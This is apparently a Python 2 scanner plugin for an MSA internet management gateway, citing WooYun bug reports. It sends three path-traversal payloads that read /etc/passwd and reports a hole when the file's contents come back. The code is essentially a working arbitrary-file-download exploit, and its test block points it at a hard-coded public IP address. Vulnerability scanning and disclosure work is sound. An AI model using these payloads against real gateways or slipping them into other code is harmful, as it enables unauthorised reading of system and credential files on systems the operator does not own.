#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: MSA互联网管理网关三处任意文件下载
refer: http://wooyun.org/bugs/wooyun-2015-0112275
refer: http://www.wooyun.org/bugs/wooyun-2010-0115645
description:
    /../../../../etc/passwd
    /msa/../../../../etc/passwd
    /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
'''

import re
import urlparse


def assign(service, arg):
    if service == 'jindun_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payloads = [
        arg + '../../../../etc/passwd',
        arg + 'msa/../../../../etc/passwd',
        arg + 'msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd'
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and 'root:' in res:
            security_hole('Arbitral file download: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('jindun_gateway','http://221.12.56.242/')[1])